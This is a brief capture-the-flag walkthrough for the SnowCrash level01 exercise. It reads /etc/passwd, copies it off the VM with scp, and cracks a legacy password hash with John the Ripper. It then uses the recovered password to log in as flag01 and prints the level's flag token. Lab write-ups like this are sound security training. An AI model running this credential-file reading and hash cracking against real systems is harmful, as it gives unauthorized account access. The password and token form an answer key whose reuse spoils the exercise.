```sh
$> ls -l /etc/passwd
-rw-r--r-- 1 root root 2477 Mar  5  2016 /etc/passwd
```

We can read it


```sh
$> cat passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

Go to a Kali Linux VM and run the following command:

```sh
$> scp -P4242 level01@192.168.56.102:/etc/passwd .

$> ls passwd
passwd

$> john passwd
[...]
abcdefg          (flag01)
```

Back to snowcrash's VM:

```sh
$> su flag01
Password: abcdefg

$> getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```
